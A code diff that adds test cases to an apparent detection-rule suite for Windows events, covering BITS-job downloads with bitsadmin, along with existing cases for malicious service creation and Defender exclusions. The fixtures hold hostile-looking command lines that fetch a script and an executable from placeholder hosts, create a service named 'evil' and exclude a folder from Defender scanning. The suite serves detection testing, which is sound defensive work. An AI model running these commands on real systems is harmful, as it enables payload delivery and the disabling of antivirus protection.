@@ -87,6 +87,17 @@ CASES = [
     ("sc create (bin, wrong verb) — precision", "100507",
      {"win.eventdata.originalFileName": "sc.exe", "win.eventdata.image": r"C:\Windows\System32\sc.exe",
       "win.eventdata.commandLine": "sc create evil binPath= C:\\evil.exe"}, False),
+    # T1197 — BITS Jobs download (bitsadmin) — needs bitsadmin.exe AND a transfer verb.
+    # TP event mirrors the live Atomic T1197-1 command line surfaced by the rare-process hunt.
+    ("bitsadmin /transfer download (image variant)", "100511",
+     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
+      "win.eventdata.commandLine": "bitsadmin.exe  /transfer /Download /priority Foreground https://x/y C:\\Users\\a\\Temp\\b.ps1"}, True),
+    ("bitsadmin /transfer download (originalFileName variant)", "100512",
+     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
+      "win.eventdata.commandLine": "bitsadmin.exe  /transfer job /addfile http://10.0.0.1/a.exe C:\\a.exe"}, True),
+    ("bitsadmin /list (enumerate jobs, no transfer) — precision", "100511",
+     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
+      "win.eventdata.commandLine": "bitsadmin /list /allusers /verbose"}, False),
     # T1562.001 — Defender exclusion via PowerShell (ps_script, EID 4104) — cmdlet AND -Exclusion*
     ("Add-MpPreference -ExclusionPath (cmdlet + exclusion)", "100506",
      {"win.eventdata.scriptBlockText": "Add-MpPreference -ExclusionPath C:\\Users\\Public"}, True),
